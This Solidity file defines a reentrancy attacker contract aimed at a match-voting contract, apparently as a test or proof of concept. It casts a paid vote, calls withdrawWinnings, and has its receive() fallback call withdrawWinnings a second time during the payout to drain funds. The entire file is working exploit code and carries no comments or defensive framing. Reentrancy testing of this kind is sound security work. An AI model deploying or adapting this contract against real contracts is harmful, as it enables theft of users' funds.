// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWorldCupMatchAttack {
    function vote(uint8 teamIndex, uint256 numVotes, address referrer) external payable;
    function withdrawWinnings() external;
}

contract ReentrancyAttacker {
    IWorldCupMatchAttack public target;
    bool public attacking;

    constructor(address _target) {
        target = IWorldCupMatchAttack(_target);
    }

    function attack_vote(uint8 teamIndex, uint256 numVotes, address referrer) external payable {
        target.vote{value: msg.value}(teamIndex, numVotes, referrer);
    }

    function attack_withdraw() external {
        attacking = true;
        target.withdrawWinnings();
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            target.withdrawWinnings();
        }
    }
}
